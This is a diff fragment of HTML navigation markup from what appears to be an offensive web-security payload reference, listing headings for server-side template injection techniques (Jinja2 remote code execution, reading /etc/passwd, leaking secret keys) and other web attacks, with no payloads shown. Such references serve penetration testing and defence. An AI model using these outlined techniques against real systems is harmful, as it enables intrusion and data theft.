+        
+          <li class="md-nav__item">
+  <a href="#jinja2-dump-all-used-classes" class="md-nav__link">
+    Jinja2 - Dump all used classes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-dump-all-config-variables" class="md-nav__link">
+    Jinja2 - Dump all config variables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-read-remote-file" class="md-nav__link">
+    Jinja2 - Read remote file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-write-into-remote-file" class="md-nav__link">
+    Jinja2 - Write into remote file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-remote-code-execution" class="md-nav__link">
+    Jinja2 - Remote Code Execution
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2 - Remote Code Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-ospopenread" class="md-nav__link">
+    Exploit the SSTI by calling os.popen().read()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-subprocesspopen" class="md-nav__link">
+    Exploit the SSTI by calling subprocess.Popen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset" class="md-nav__link">
+    Exploit the SSTI by calling Popen without guessing the offset
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-writing-an-evil-config-file" class="md-nav__link">
+    Exploit the SSTI by writing an evil config file.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-filter-bypass" class="md-nav__link">
+    Jinja2 - Filter bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinjava" class="md-nav__link">
+    Jinjava
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinjava">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinjava-basic-injection" class="md-nav__link">
+    Jinjava - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinjava-command-execution" class="md-nav__link">
+    Jinjava - Command execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessjs" class="md-nav__link">
+    Lessjs
+  </a>
+  
+    <nav class="md-nav" aria-label="Lessjs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lessjs-ssrf-lfi" class="md-nav__link">
+    Lessjs - SSRF / LFI
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessjs-v3-command-execution" class="md-nav__link">
+    Lessjs &lt; v3 - Command Execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#plugins" class="md-nav__link">
+    Plugins
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mako" class="md-nav__link">
+    Mako
+  </a>
+  
+    <nav class="md-nav" aria-label="Mako">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#direct-access-to-os-from-templatenamespace" class="md-nav__link">
+    Direct access to os from TemplateNamespace:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pebble" class="md-nav__link">
+    Pebble
+  </a>
+  
+    <nav class="md-nav" aria-label="Pebble">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pebble-basic-injection" class="md-nav__link">
+    Pebble - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pebble-code-execution" class="md-nav__link">
+    Pebble - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ruby" class="md-nav__link">
+    Ruby
+  </a>
+  
+    <nav class="md-nav" aria-label="Ruby">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ruby-basic-injections" class="md-nav__link">
+    Ruby - Basic injections
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-retrieve-etcpasswd" class="md-nav__link">
+    Ruby - Retrieve /etc/passwd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-list-files-and-directories" class="md-nav__link">
+    Ruby - List files and directories
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-code-execution" class="md-nav__link">
+    Ruby - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smarty" class="md-nav__link">
+    Smarty
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#twig" class="md-nav__link">
+    Twig
+  </a>
+  
+    <nav class="md-nav" aria-label="Twig">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#twig-basic-injection" class="md-nav__link">
+    Twig - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-template-format" class="md-nav__link">
+    Twig - Template format
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-arbitrary-file-reading" class="md-nav__link">
+    Twig - Arbitrary File Reading
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-code-execution" class="md-nav__link">
+    Twig - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#velocity" class="md-nav__link">
+    Velocity
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_40" type="checkbox" id="__nav_40" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tabnabbing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_41" type="checkbox" id="__nav_41" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Type Juggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Type%20Juggling/" class="md-nav__link">
+        PHP Juggling type and magic hashes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42" type="checkbox" id="__nav_42" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Upload Insecure Files" data-md-level="1">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_2" type="checkbox" id="__nav_42_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_2">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Ffmpeg HLS" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_3" type="checkbox" id="__nav_42_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_3">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Apache .htaccess" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_4" type="checkbox" id="__nav_42_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_4">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Busybox httpd.conf" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_5" type="checkbox" id="__nav_42_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_5">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extension Flash" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_5">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_6" type="checkbox" id="__nav_42_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_6">
+          Picture Image Magik
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Picture Image Magik" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_6">
+          <span class="md-nav__icon md-icon"></span>
+          Picture Image Magik
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
+        Image Tragik 1 & 2
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_7" type="checkbox" id="__nav_42_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_7">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Zip Slip" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_7">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_43" type="checkbox" id="__nav_43" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Cache Deception" data-md-level="1">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception Attack
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_44" type="checkbox" id="__nav_44" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Sockets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Sockets/" class="md-nav__link">
+        Web Sockets Attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_45" type="checkbox" id="__nav_45" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XPATH Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XPATH%20Injection/" class="md-nav__link">
+        XPATH injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_46" type="checkbox" id="__nav_46" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSLT Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_47" type="checkbox" id="__nav_47" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSS Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_48" type="checkbox" id="__nav_48" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_49" type="checkbox" id="__nav_49" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label=" template vuln" data-md-level="1">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methodology" class="md-nav__link">
+    Methodology
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    Detection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aspnet-razor" class="md-nav__link">
+    ASP.NET Razor
+  </a>
+  
+    <nav class="md-nav" aria-label="ASP.NET Razor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#aspnet-razor-basic-injection" class="md-nav__link">
+    ASP.NET Razor - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aspnet-razor-command-execution" class="md-nav__link">
+    ASP.NET Razor - Command execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#expression-language-el" class="md-nav__link">
+    Expression Language EL
+  </a>
+  
+    <nav class="md-nav" aria-label="Expression Language EL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-basic-injection" class="md-nav__link">
+    Expression Language EL - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-one-liner-injections-not-including-code-execution" class="md-nav__link">
+    Expression Language EL - One-Liner injections not including code execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expression-language-el-code-execution" class="md-nav__link">
+    Expression Language EL - Code Execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#freemarker" class="md-nav__link">
+    Freemarker
+  </a>
+  
+    <nav class="md-nav" aria-label="Freemarker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-basic-injection" class="md-nav__link">
+    Freemarker - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-read-file" class="md-nav__link">
+    Freemarker - Read File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-code-execution" class="md-nav__link">
+    Freemarker - Code execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#freemarker-sandbox-bypass" class="md-nav__link">
+    Freemarker - Sandbox bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#groovy" class="md-nav__link">
+    Groovy
+  </a>
+  
+    <nav class="md-nav" aria-label="Groovy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#groovy-basic-injection" class="md-nav__link">
+    Groovy - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-read-and-create-file" class="md-nav__link">
+    Groovy - Read and create File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-http-request" class="md-nav__link">
+    Groovy - HTTP request:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-command-execution" class="md-nav__link">
+    Groovy - Command Execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#groovy-sandbox-bypass" class="md-nav__link">
+    Groovy - Sandbox Bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#handlebars" class="md-nav__link">
+    Handlebars
+  </a>
+  
+    <nav class="md-nav" aria-label="Handlebars">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#handlebars-command-execution" class="md-nav__link">
+    Handlebars - Command Execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jade-codepen" class="md-nav__link">
+    Jade / Codepen
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    Java
+  </a>
+  
+    <nav class="md-nav" aria-label="Java">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java-basic-injection" class="md-nav__link">
+    Java - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-retrieve-the-systems-environment-variables" class="md-nav__link">
+    Java - Retrieve the system’s environment variables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-retrieve-etcpasswd" class="md-nav__link">
+    Java - Retrieve /etc/passwd
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#django-templates" class="md-nav__link">
+    Django Templates
+  </a>
+  
+    <nav class="md-nav" aria-label="Django Templates">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_1" class="md-nav__link">
+    Detection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#django-templates-for-post-exploitation" class="md-nav__link">
+    Django Templates for post-exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting" class="md-nav__link">
+    Cross-site scripting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debug-information-leak" class="md-nav__link">
+    Debug information leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leaking-apps-secret-key" class="md-nav__link">
+    Leaking app’s Secret Key
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#admin-site-url-leak" class="md-nav__link">
+    Admin Site URL leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#admin-username-and-password-hash-leak" class="md-nav__link">
+    Admin username and password hash leak
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinja2" class="md-nav__link">
+    Jinja2
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-basic-injection" class="md-nav__link">
+    Jinja2 - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-template-format" class="md-nav__link">
+    Jinja2 - Template format
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-debug-statement" class="md-nav__link">
+    Jinja2 - Debug Statement
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-dump-all-used-classes" class="md-nav__link">
+    Jinja2 - Dump all used classes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-dump-all-config-variables" class="md-nav__link">
+    Jinja2 - Dump all config variables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-read-remote-file" class="md-nav__link">
+    Jinja2 - Read remote file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-write-into-remote-file" class="md-nav__link">
+    Jinja2 - Write into remote file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-remote-code-execution" class="md-nav__link">
+    Jinja2 - Remote Code Execution
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2 - Remote Code Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-ospopenread" class="md-nav__link">
+    Exploit the SSTI by calling os.popen().read()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-subprocesspopen" class="md-nav__link">
+    Exploit the SSTI by calling subprocess.Popen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset" class="md-nav__link">
+    Exploit the SSTI by calling Popen without guessing the offset
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-the-ssti-by-writing-an-evil-config-file" class="md-nav__link">
+    Exploit the SSTI by writing an evil config file.
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinja2-filter-bypass" class="md-nav__link">
+    Jinja2 - Filter bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinjava" class="md-nav__link">
+    Jinjava
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinjava">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jinjava-basic-injection" class="md-nav__link">
+    Jinjava - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jinjava-command-execution" class="md-nav__link">
+    Jinjava - Command execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessjs" class="md-nav__link">
